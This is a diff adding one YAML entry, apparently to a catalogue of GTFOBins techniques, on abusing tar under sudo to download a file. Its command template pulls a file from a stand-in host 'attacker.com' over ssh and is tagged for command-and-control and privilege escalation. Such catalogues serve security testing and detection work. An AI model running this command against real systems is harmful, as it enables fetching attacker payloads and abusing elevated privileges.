@@ -1,0 +1,25 @@
+id: gtfobins/tar/download/sudo
+type: binary
+platform: linux
+name: tar
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
+  comment: The attacker box must have the `rmt` utility installed.
+references:
+- https://gtfobins.github.io/gtfobins/tar/
+tags:
+- linux
+- unix
+- gtfobins
